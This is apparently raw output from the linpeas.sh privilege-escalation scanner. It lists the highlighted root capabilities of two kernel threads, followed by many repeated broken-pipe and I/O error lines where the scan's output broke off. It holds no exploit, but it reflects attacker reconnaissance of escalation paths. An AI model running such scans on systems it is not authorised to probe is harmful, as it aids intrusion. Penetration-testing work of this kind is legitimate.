  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 39 (blkcg_punt_bio) user=root
  CapInh: 0x0000000000000000=
  CapPrm: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapEff: 0x000001ffffffffff=[1;31;103mcap_chown[0m,[1;31;103mcap_dac_override[0m,[1;31;103mcap_dac_read_search[0m,[1;31;103mcap_fowner[0m,[1;31;103mcap_fsetid[0m,[1;31;103mcap_kill[0m,[1;31;103mcap_setgid[0m,[1;31;103mcap_setuid[0m,[1;31;103mcap_setpcap[0m,cap_linux_immutable,[1;31;103mcap_net_bind_service[0m,cap_net_broadcast,[1;31;103mcap_net_admin[0m,[1;31;103mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31;103mcap_sys_module[0m,[1;31;103mcap_sys_rawio[0m,cap_sys_chroot,[1;31;103mcap_sys_ptrace[0m,cap_sys_pacct,[1;31;103mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31;103mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31;103mcap_perfmon[0m,[1;31;103mcap_bpf[0m,cap_checkpoint_restore
  CapBnd: 0x000001ffffffffff=[1;31mcap_chown[0m,[1;31mcap_dac_override[0m,[1;31mcap_dac_read_search[0m,[1;31mcap_fowner[0m,[1;31mcap_fsetid[0m,[1;31mcap_kill[0m,[1;31mcap_setgid[0m,[1;31mcap_setuid[0m,[1;31mcap_setpcap[0m,cap_linux_immutable,[1;31mcap_net_bind_service[0m,cap_net_broadcast,[1;31mcap_net_admin[0m,[1;31mcap_net_raw[0m,cap_ipc_lock,cap_ipc_owner,[1;31mcap_sys_module[0m,[1;31mcap_sys_rawio[0m,cap_sys_chroot,[1;31mcap_sys_ptrace[0m,cap_sys_pacct,[1;31mcap_sys_admin[0m,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,[1;31mcap_setfcap[0m,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read,[1;31mcap_perfmon[0m,[1;31mcap_bpf[0m,cap_checkpoint_restore
  CapAmb: 0x0000000000000000=

PID 40 (tpm_dev_wq) user=root
  CapInh: 0x0000000000000000=
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
sed: couldn't flush stdout: Broken pipe
./linpeas.sh: 10644: echo: echo: I/O error
./linpeas.sh: 10633: echo: echo: I/O error
